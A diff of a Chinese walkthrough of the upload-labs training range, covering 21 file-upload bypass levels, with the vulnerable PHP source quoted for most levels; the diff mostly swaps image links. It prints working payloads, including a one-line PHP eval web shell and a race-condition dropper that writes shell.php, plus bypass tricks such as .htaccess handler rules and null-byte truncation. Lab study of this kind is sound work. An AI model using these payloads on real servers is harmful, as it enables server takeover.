@@ -1,8 +1,8 @@
-﻿@[TOC]
+﻿[TOC]
+
+
 # 一、upload-labs 靶场简介
 upload-labs是一个使用php语言编写的，专门收集渗透测试和CTF中遇到的各种上传漏洞的靶场。旨在帮助大家对上传漏洞有一个全面的了解。目前一共21关，每一关都包含着不同上传方式。
-
-
 
 > 1.每一关没有固定的通关方法，大家不要自限思维！
 2.本项目提供的writeup只是起一个参考作用，希望大家可以分享出自己的通关思路。
@@ -14,6 +14,7 @@ upload-labs是一个使用php语言编写的，专门收集渗透测试和CTF中
 项目地址：https://github.com/c0ny1/upload-labs
 
 # 二、打靶记录
+
 ## Pass-01 JS 校验
 本关卡为JS检验。漏洞描述：利用前端 JS 对上传文件后缀进行校验，后端没进行检测
 
@@ -22,16 +23,16 @@ upload-labs是一个使用php语言编写的，专门收集渗透测试和CTF中
 >  - 浏览器前端修改
 >   - Burp抓包绕过
 
-1. 通过测试，我们发现非图片格式的文件确实无法提交上去，我们先尝试第一种方法：在开发者工具中的设置中找到“停用JavaScript”，选中即可，我们再尝试提交非图片格式的文件，发现成功，![在这里插入图片描述](https://img-blog.csdnimg.cn/56dce8a2a7cb43bdb1fd656755b65a26.jpeg#pic_center)
+1. 通过测试，我们发现非图片格式的文件确实无法提交上去，我们先尝试第一种方法：在开发者工具中的设置中找到“停用JavaScript”，选中即可，我们再尝试提交非图片格式的文件，发现成功，![1](./upload-labs靶场打靶记录.assets/1.jpg)
 2. 我们尝试第二种方法，浏览器前端修改，我们观察可以发现，在提交表单时浏览器会用`onsubmit`属性进行判断，只有符合其规定之后才可以上传，那么我们可以选择直接将这里的`onsubmit`属性中的`return checkFile()`函数删除，也就可以将`return checkFile()`破坏掉：(在定义`return checkFile()`处将其函数结构破坏) 
- **但是，浏览器通常会对这个行为进行一定的限制，比如笔者在测试的时候发现用Edge浏览器便无法通过这种方式上传，但是Firefox浏览器可以。**
-    ![在这里插入图片描述](https://img-blog.csdnimg.cn/68e613d038694bf6bf01d7d67440bce6.jpeg#pic_center)
+ **但是，浏览器通常会对这个行为进行一定的限制，比如笔者在测试的时候发现用Edge浏览器便无法通过这种方式上传，但是Firefox浏览器可以。**![4](./upload-labs靶场打靶记录.assets/4-1706707119540-2.jpg)
+    
+3. 第三种方法的解释：因为是前端js拦截了，所以我们先将php文件后缀修改成合法的格式（.jpg），使用burpsuite抓包，再修改.php后缀，也可以绕过前端验证。![3](./upload-labs靶场打靶记录.assets/3.jpg)
 
-3. 第三种方法的解释：因为是前端js拦截了，所以我们先将php文件后缀修改成合法的格式（.jpg），使用burpsuite抓包，再修改.php后缀，也可以绕过前端验证。
-![在这里插入图片描述](https://img-blog.csdnimg.cn/c2aa2ecbe53c4122895e901829509b6a.jpeg#pic_center)
 
 
 ## Pass-02 文件类型校验(MIME 校验)
+
 1. 漏洞描述：只检测 content-type 字段导致的漏洞。(后端利用 PHP 的全局数组 `$_FILES()`获取上传文件信息)
 利用方法：修改 content-type 字段的值为图片格式。
 
@@ -44,10 +45,11 @@ upload-labs是一个使用php语言编写的，专门收集渗透测试和CTF中
 >  - text/html ： HTML 格式
 
 
-1. 我们将我们要上传的文件直接上传，发现提示错误，这时候我们看一看Burp抓到的数据包，发现现在的content-type 字段为application/octet-stream  （我上传了一个.md格式文件），这时候我们只需要将其改成image/jpeg即可![在这里插入图片描述](https://img-blog.csdnimg.cn/bc81827e64ad41a8904ab157e02cd8b2.jpeg#pic_center)
-![在这里插入图片描述](https://img-blog.csdnimg.cn/b167812ae0864158926f2f107b5bb4ac.jpeg#pic_center)
+1. 我们将我们要上传的文件直接上传，发现提示错误，这时候我们看一看Burp抓到的数据包，发现现在的content-type 字段为application/octet-stream  （我上传了一个.md格式文件），这时候我们只需要将其改成image/jpeg即可![5](./upload-labs靶场打靶记录.assets/5.jpg)
+![在这里插入图片描述](./upload-labs靶场打靶记录.assets/6.jpg)
 
 ## Pass-03 文件名后缀校验(黑名单绕过)
+
 漏洞描述：使用黑名单的方式限制文件上传类型，后端利用`$_FILES()`和 `strrchr()`获取文件名后缀。被限制文件类型： .asp .aspx .php .jsp
 
 利用方法：因为是利用黑名单来限制文件上传类型，找漏网之鱼绕过
@@ -89,6 +91,7 @@ if (isset($_POST['submit'])) {
 
 
 ## Pass-04 文件名后缀校验 (配置文件解析控制) .htaccess
+
 分析源码：我们发现这一关的过滤比第三过更多了，使用第三关的方法是行不通了。
 但是没有限制 .htaccess
 
@@ -140,12 +143,16 @@ if (isset($_POST['submit'])) {
 </FilesMatch>
 ```
 > htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。
-> 
-在上述配置中，FilesMatch表示匹配1.png的文件，当该文件名匹配成功后，SetHandler表示将该文件作为PHP类型的文件来进行处置。然后上传该文件。![在这里插入图片描述](https://img-blog.csdnimg.cn/5765a59db2c2495f838a14682b4eed07.jpeg#pic_center)
+>
+> 在上述配置中，FilesMatch表示匹配1.png的文件，当该文件名匹配成功后，SetHandler表示将该文件作为PHP类型的文件来进行处置。然后上传该文件。
+
+ ![在这里插入图片描述](./upload-labs靶场打靶记录.assets/7.jpg)
+
+ 
 
 
 4. 之后，我们再上传一个jpg文件，注意，这个jpg文件并不是正常的文件！！
-那么我们再创建一个php文件，其内容设置为`<?php  phpinfo(); ?>`,然后再将此文件后缀改为jpg，上传。![在这里插入图片描述](https://img-blog.csdnimg.cn/2ae96d96d6d04e90a8e1fa49c4270f9c.jpeg#pic_center)
+那么我们再创建一个php文件，其内容设置为`<?php  phpinfo(); ?>`,然后再将此文件后缀改为jpg，上传。![在这里插入图片描述](./upload-labs靶场打靶记录.assets/8.jpg)
 5. 之后我们再访问上传上的图片，便可以成功看到phpinfo界面。**但是需要注意的是.htaccess文件是apache默认的文件名，所以如果后台有对上传文件强制改名的机制，那么这种方法也就失效了。**
 6. 其实我上面的步骤做错了，注意.htaccess文件不能起名字，他就是.htaccess文件，如果你将他改为4.htaccess或者其他的什么名字是不可以的，无法解析。在实战中有可能上传上去这个文件会被自动重命名，被重命名了就不可以了。
 
@@ -175,7 +182,7 @@ if (isset($_POST['submit'])) {
 > .user.ini 文件上传漏洞的前提：
 > .user.ini 可以生效并且该上传目录有PHP文件
 1. 我们像上关一样上传.htaccess文件，但提示 “此文件类型不允许上传！” 说明过滤了该文件。那我们就先制作一个jpg文件，注意，这个jpg文件并不是正常的文件，这个文件是先将一个php文件内容设置为`<?php  phpinfo(); ?>`,然后再将此文件后缀改为jpg得到的。
-2. 接下来我们再写一个.user.ini文件，其内容为`auto_prepend_file=1.jpg`,理解这个语句可以先将其理解为include,意思是在执行操作前先运行一下1.jpg文件中的内容，而我们的jpg中便是一些php代码。![在这里插入图片描述](https://img-blog.csdnimg.cn/662b9321a3bf40b7bf520b270969d910.jpeg#pic_center)
+2. 接下来我们再写一个.user.ini文件，其内容为`auto_prepend_file=1.jpg`,理解这个语句可以先将其理解为include,意思是在执行操作前先运行一下1.jpg文件中的内容，而我们的jpg中便是一些php代码。![在这里插入图片描述](./upload-labs靶场打靶记录.assets/14.jpg)
 3. 之后我们先上传.user.ini文件，再上传1.jpg文件即可
 > 
 > 想要引发 .user.ini 解析漏洞需要三个前提条件：
@@ -185,6 +192,7 @@ if (isset($_POST['submit'])) {
 >  - 上传目录下要有可执行的php文件
 
 ##  Pass-06 文件名后缀校验 (大小写绕过)
+
 1. 我们先分析分析后端代码：
 
 ```php
@@ -221,9 +229,10 @@ if (isset($_POST['submit'])) {
 > **大小写绕过原理**： Windows系统下 ，对于文件名中的大小写不敏感。例如：test.php和 TeSt.PHP 是一 样的。
 Linux系统下 ，对于文件名中的大小写敏感。例如：test.php和 TesT.php就是不一样的。
 
-![在这里插入图片描述](https://img-blog.csdnimg.cn/db82198775e545048d700371a8caf3e3.jpeg#pic_center)
+![在这里插入图片描述](./upload-labs靶场打靶记录.assets/9.jpg)
 
 ##  Pass-07 文件名后缀校验 (空格绕过)
+
 1. 我们还是先看一看后端代码：
 
 ```php
@@ -256,8 +265,10 @@ if (isset($_POST['submit'])) {
 ```
 2. 观察发现，本关少了一步首尾去空的步骤（`$file_ext = trim($file_ext);` ），这样的话我们可以采取空格绕过。
 但是有一个问题：在windows系统下对文件重命名，系统会自动将后缀结尾的空格删除，而我们的解决方案便是burp抓包修改
-3. 我们上传文件，在Burp中抓包。将“1.php”修改为“1.php ”(后者最后有空格)，放行拦截到的数据包，上传成功。![在这里插入图片描述](https://img-blog.csdnimg.cn/bdedec67e5514cd3a7512126251b7de4.jpeg#pic_center)
+3. 我们上传文件，在Burp中抓包。将“1.php”修改为“1.php ”(后者最后有空格)，放行拦截到的数据包，上传成功。![在这里插入图片描述](./upload-labs靶场打靶记录.assets/10.jpg)
+
 ##  Pass-08 文件名后缀校验 (点号绕过)
+
 1. 分析后端代码：
 
 ```php
@@ -289,8 +300,9 @@ if (isset($_POST['submit'])) {
 }
 ```
 2. 分析发现：没有对上传的文件后缀名未做去点.的操作 `strrchr($file_name, '. ')`，那我们将后缀改为“1.php.”不就好了？错了，依旧不行，windows系统会自动删除后缀最后的点，所以我们依旧是Burp抓包修改。上传成功。
-![在这里插入图片描述](https://img-blog.csdnimg.cn/c10e2d975ef74df4bedd81351ad160ec.jpeg#pic_center)
-![在这里插入图片描述](https://img-blog.csdnimg.cn/aaa7e7be36ef43de8e4b6a9d029a3a27.jpeg#pic_center)
+![在这里插入图片描述](./upload-labs靶场打靶记录.assets/11.jpg)
+![在这里插入图片描述](./upload-labs靶场打靶记录.assets/12.jpg)
+
 ##  Pass-09 文件名后缀校验 (::$DATA 绕过)
 
 解析：在php+windows的情况下：如果文件名+"::$DATA"会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持"::$DATA"之前的文件名。利用windows特性，可在后缀名中加” ::$DATA”绕过。
@@ -328,9 +340,11 @@ if (isset($_POST['submit'])) {
 ```
 2. 分析本关源码：我们会发现本关少了去除字符串的一步，`$file_ext = str_ireplace('::$DATA', '', $file_ext);`
 那我们便在这里弄一些小操作，我们用Burp抓包，之后将文件名最后加上“::$DATA”，上传成功。
-![在这里插入图片描述](https://img-blog.csdnimg.cn/e3568a8d9dbc4ebbaadcf16b9c043d9b.jpeg#pic_center)
+![在这里插入图片描述](./upload-labs靶场打靶记录.assets/13.jpg)
 3. 我猜你看到这里的时候并不是很明白，请在看看下面的文字吧：我们在文件的后缀中加上$"::$DATA"，可以绕过验证，而在windows系统中，文件名不允许包含“:”等非法字符,所以后端在接收到此文件之后，会自动将文件后面的::$DATA去掉，从而其实后缀变为.php
+
 ##  Pass-10 文件名后缀校验 (拼接绕过)
+
 1. 后端代码如下：
 
 ```php
@@ -364,7 +378,9 @@ if (isset($_POST['submit'])) {
 ```
 
 2. 分析发现：先将首尾去空，又去除了::$DATA又转换为小写，再删去末尾的点。这样一来我们构造文件名，使其经过过滤后得到的还是php的文件名不就行了，所以就1.php. . 就可以绕过，也就是点+空格+点+空格绕过
+
 ##  Pass-11 文件名后缀校验 (双写绕过)
+
 1. 瞅瞅后端源码：
 
 ```php
@@ -425,13 +441,14 @@ if(isset($_POST['submit'])){
 首先可以看到一个白名单`ext_arr` ，只有在此数组中的后缀名才能通过。
 接着我们看到`$file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],".")+1);`，这个东西的意思是：（第一个参数：在什么东西上面执行操作，这里是文件名），（第二个参数：从第几位开始读取（这里是先找到文件名中的最后一个点，然后在+1，意思是获取点之后的字符串）），（其实还有第三个参数，但是这里没有用））
 
-3. `$img_path = $_GET['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext;`这个可以看到他是先GET获取要保存的文件的路径，然后用随机数和时间戳作为文件名，最后将文件后缀拼接上去，我们依旧是上传假冒jpg格式文件，用Burp抓包，然后修改内容，如下图：![在这里插入图片描述](https://img-blog.csdnimg.cn/fe399beb92d54c0cb8e7bfad6804686b.jpeg#pic_center)
+3. `$img_path = $_GET['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext;`这个可以看到他是先GET获取要保存的文件的路径，然后用随机数和时间戳作为文件名，最后将文件后缀拼接上去，我们依旧是上传假冒jpg格式文件，用Burp抓包，然后修改内容，如下图：![在这里插入图片描述](./upload-labs靶场打靶记录.assets/15.jpg)
 4. 至于为什么要加这些内容，请听我解释：修改的地方是文件要存储的路径，我们加上.php%00之后，文件名称会拼接在这后面，但是这时候的拼接已经没有用了，因为%00截断了，也就是说留下来的只有.php。这便起到了我们想要的效果。
 5. 这一关是GET型的，也就是说不需要用Burp，直接在url中添加1.php%00也可以。
 
 ##  Pass-13 白名单校验 ( POST 型 0x00 截断)
+
 1. 上一关是%00截断，而这一关是0x00截断，这是为啥，因为上一关是GET型的，直接在url中编码，而这一关是编程语言的编码
-2. 我们依旧是Burp抓包修改，但是不是直接写为.php0x00,下图为错误示例：![在这里插入图片描述](https://img-blog.csdnimg.cn/07160dfe721149338e2fb6feef819752.jpeg#pic_center)
+2. 我们依旧是Burp抓包修改，但是不是直接写为.php0x00,下图为错误示例：![在这里插入图片描述](./upload-labs靶场打靶记录.assets/16.jpg)
 3. 这里其实应该写为1.php (php后面有一个空格)，然后选中这个空格（额……wo真的选中了，这个Burp显示有问题）然后在右边，将hex内容改为00，点击“应用修改”，放行拦截到的数据包即可
 4. 需要注意的是：因为是 POST 型，所以需要在 16 进制中修改，因为 POST 不会像 GET 那 样对%00 进行自动解码。
 
@@ -504,6 +521,7 @@ if(isset($_POST['submit'])){
 3. 但其实这时候用蚁剑连接也无法连接，因为它仍然是被当作图片等格式解析的，我们看一看upload-labs的关卡界面，它说要“使用文件包含漏洞能运行图片马中的恶意代码”，所以我们使用文件包含漏洞即可
 
 ##  Pass-15 文件内容检测 (getimagesize()校验)
+
 1. 观察源码：
 
 ```php
@@ -555,18 +573,19 @@ if(isset($_POST['submit'])){
 > 如果getimagesize()函数无法读取图像信息，则返回false。否则，返回一个包含上述索引的数组。
 
 ##  Pass-16 文件内容检测 (exif_imagetype()绕过)
+
 1. 漏洞描述：利用 php 内置函数 exif_imagetype()获取图片类型 (需要开启 php_exif 模块)
 2. 预定义高度宽度：
 例 .htaccess 文件
 文件内容:
-#define width 1337
-#define height 1337
+
 3. 利用 x00x00x8ax39x8ax39 文件头x00x00x8ax30x8ax39 是 wbmp 文件的文件头，但 0x00在.htaccess 文件中为是注释符，不会影响文件本身。使用十六进制编辑器或者 python 的 bytes 字符类型(b’’)来进行添加。
 payload:shell = b"\x00\x00\x8a\x39\x8a\x39"+b"00" + '文件内容'
 4. 其实其他操作和前几关一样
 
 
 ##  Pass-17 文件内容检测 (二次渲染)
+
 1. 查看源码：
 
 ```php
@@ -657,31 +676,35 @@ if (isset($_POST['submit'])){
 ```
 2. 在源码中有这么一句比较特殊，也是这一关的重点： `$im = imagecreatefrompng($target_path);`这个的意思是对图片进行重新渲染，也就是说，将图片格式之外的内容会被删去，就比如说我们之前用 cmd 里执行 `copy logo.jpg/b+test.php/a test.jpg`生成的图片，其文件末尾会有php语句，而在二次渲染之后就会消失。
 3. 基于此，我们尝试去绕过，我们先上传一个合法的gif文件，（至于为什么用.gif 而不用.jpg 或者是.png ,我们之后再说），上传之后，我们在页面上右键图片，然后将上传到服务器的图片下载到本地。
-4. 这时候，我们先比较比较经过渲染之后的图片与原图片有何区别，我们打开010editor，然后选择“比较文件”，分别选择两张图片，再点击“匹配”，然后再其中插入东西。![在这里插入图片描述](https://img-blog.csdnimg.cn/3f0477becad8417893019ace3ebb7aeb.jpeg#pic_center)![在这里插入图片描述](https://img-blog.csdnimg.cn/0f1444e29f3441be94f17f2f3eff8cac.jpeg#pic_center)
+4. 这时候，我们先比较比较经过渲染之后的图片与原图片有何区别，我们打开010editor，然后选择“比较文件”，分别选择两张图片，再点击“匹配”，然后再其中插入东西。![在这里插入图片描述](./upload-labs靶场打靶记录.assets/18.jpg)![在这里插入图片描述](https://img-blog.csdnimg.cn/0f1444e29f3441be94f17f2f3eff8cac.jpeg#pic_center)
 5. 这时候我们有两种方法，一种是在最初的图片上做修改，第二种是在经过第一次渲染之后的图片上做修改
 6. 先说第一种，我们将我们的PHP语句插入到未经修改的部分（最好靠后一些），然后再将插入php语句的照片上传。再次下载下上传到服务器的照片可以发现里面的PHP语句并没有被删除。
-![在这里插入图片描述](https://img-blog.csdnimg.cn/4a6ca47568624fce906be4c1899ff1ca.jpeg#pic_center)
-![在这里插入图片描述](https://img-blog.csdnimg.cn/142fa4101ba2461dadfa3ec96127829a.jpeg#pic_center)
+![在这里插入图片描述](./upload-labs靶场打靶记录.assets/20.jpg)
+![在这里插入图片描述](./upload-labs靶场打靶记录.assets/21.jpg)
 
 8. 第二种：插入到经过第一次渲染之后的照片里，这里的渲染只会进行一次，也就是说，渲染过后的照片再上传时并不会再次被渲染，所以我们的PHP语句也得以被保留。
 9. 这里说说为什么要用.gif 吧：如果我们用.jpg 或者.png的话，经过第一次渲染之后的图片与原图片相同的区域非常少，从而也就不适合我们插入语句。但是如果非要用.jpg 或者.png的话，那就需要经过一些编程的操作了，本节不对此做论述。
 
 ##  Pass-18 逻辑漏洞 (条件竞争)
+
 1. 这样理解条件竞争：如果只让你干A一件事，你出现差错的概率很小，但是如果让你同时干A、B、C三种事呢，你是不是很可能由于忙乱而出现些错误？这就是条件竞争。（它的重命名方式是时间戳，如果在极短时间内多次上传，文件的重命名就会因为相同而冲突，就会产生一些错误）
 
 > **文件上传条件竞争前提：** 服务器会先将任意类型文件放在服务器上，然后再判断合法性，非法则删除（文件会在服务器停留极短时间，我们使用Burp疯狂地向服务器提交请求，在其服务器忙不过来的时候便可能会出现这种问题）
+
 2. 由于我们需要长久的连接到我们的木马，但是其只能在服务器上存在极短时间，这肯定是不行的。但是，极短时间可以执行一句代码，执行什么呢，如下：`<?php fputs(fopen('shell.php','w'),'<?php @eval($_POST["cmd"]) ?>'); ?>`，这句话的意思是生成一个shell.php在服务器目录中，而其文件内容就是：`<?php @eval($_POST["cmd"]) ?>`，在此之后，上传的文件判断后仍会被删除，但是新创建的shell.php并不会被判断而删除。
-3. 理论结束，开始操作，我们先写一个php文件，其内容就是`<?php fputs(fopen('shell.php','w'),'<?php @eval($_POST["cmd"]) ?>'); ?>`，然后上传，用Burp拦截，发送到Intruder模块，设置空载，然后让Burp开始跑。![在这里插入图片描述](https://img-blog.csdnimg.cn/858642ff53494f5d83b669c511c44fbd.jpeg#pic_center)
-![在这里插入图片描述](https://img-blog.csdnimg.cn/5dfa9a6a4bd04d9c9823c33be06f6877.jpeg#pic_center)
+3. 理论结束，开始操作，我们先写一个php文件，其内容就是`<?php fputs(fopen('shell.php','w'),'<?php @eval($_POST["cmd"]) ?>'); ?>`，然后上传，用Burp拦截，发送到Intruder模块，设置空载，然后让Burp开始跑。![在这里插入图片描述](./upload-labs靶场打靶记录.assets/22.jpg)
+![在这里插入图片描述](./upload-labs靶场打靶记录.assets/23.jpg)
 4. （运气好的话）服务器上会成功出现shell.php
 
 
 ##  Pass-19 逻辑漏洞 (条件竞争-Apache解析漏洞)
+
 1. 这关也是条件竞争，但是有个区别就是，他对后缀名做了白名单判断，然后会一步一步检查文件大小、文件是否存在等等，满足之后，才会将文件上传后至服务器，对文件重新命名，同样存在条件竞争的漏洞。
 2. 这里我们先了解一下Apache的解析漏洞，在我们上传一个文件时，就比如说是1.php.7z  。比如，比如！比如apache不认识7z，那就会往前读取，这时候就会读取到php，所以你在用浏览器访问此文件的时候，也会正常读取到其中的php内容，但是，但是！但是此处的白名单中有 7z 这个后缀。
 3. 所以我们先打开Burp拦截，上传1.php，然后直接改包为 1.php.7z 然后像上一关一样发送到爆破模式，高并发数攻击即可。
 
 ##  Pass-20 逻辑漏洞 (小数点绕过)
+
 1. 后端代码：
 
 ```php
@@ -718,6 +741,7 @@ if (isset($_POST['submit'])) {
 > **move_uploaded_file() 特性：**  /.在对比黑名单的时候会忽略
 
 ##  Pass-21 逻辑漏洞 (数组绕过)
+
 1. 后端代码长这样：
 
 ```php
@@ -757,5 +781,5 @@ if(!empty($_FILES['upload_file'])){
 ```
 2. 里面有一个东西应该注意：`$file = explode('.', strtolower($file));`，这是把文件名通过“ . ”进行分割，生成一个数组（ explode() 函数把字符串打散为数组），然后 end()  函数将数组内部指针指向最后一个元素，并返回该元素的值（如果成功）。reset() 函数将内部指针指向数组中的第一个元素并输出。
 3. 因为它的逻辑是如果没有数组则创建一个数组，那么如果我们直接上传一个数组就可以绕过
-4. 我们先上传文件，用Burp拦截，将 content-type 修改为合法值，我们构造数组的时候，将第一个数组包含“ .php ”，最后一个数组是“ .jpg ”等合法后缀。其实最后一个数组可以改为大一些的，比如原来数组按正常只有两个值，我们直接arr[10]为png，这时候会将数组撑大，其中的数组值为空，这时候我们上传上去便为数组第一个元素的值，后面拼接好“ . ”，而windows自动删除最后的点。![在这里插入图片描述](https://img-blog.csdnimg.cn/8ca27fa66d6f4425b8ffff1bae8da155.jpeg#pic_center)
+4. 我们先上传文件，用Burp拦截，将 content-type 修改为合法值，我们构造数组的时候，将第一个数组包含“ .php ”，最后一个数组是“ .jpg ”等合法后缀。其实最后一个数组可以改为大一些的，比如原来数组按正常只有两个值，我们直接arr[10]为png，这时候会将数组撑大，其中的数组值为空，这时候我们上传上去便为数组第一个元素的值，后面拼接好“ . ”，而windows自动删除最后的点。![在这里插入图片描述](./upload-labs靶场打靶记录.assets/24.jpg)
 
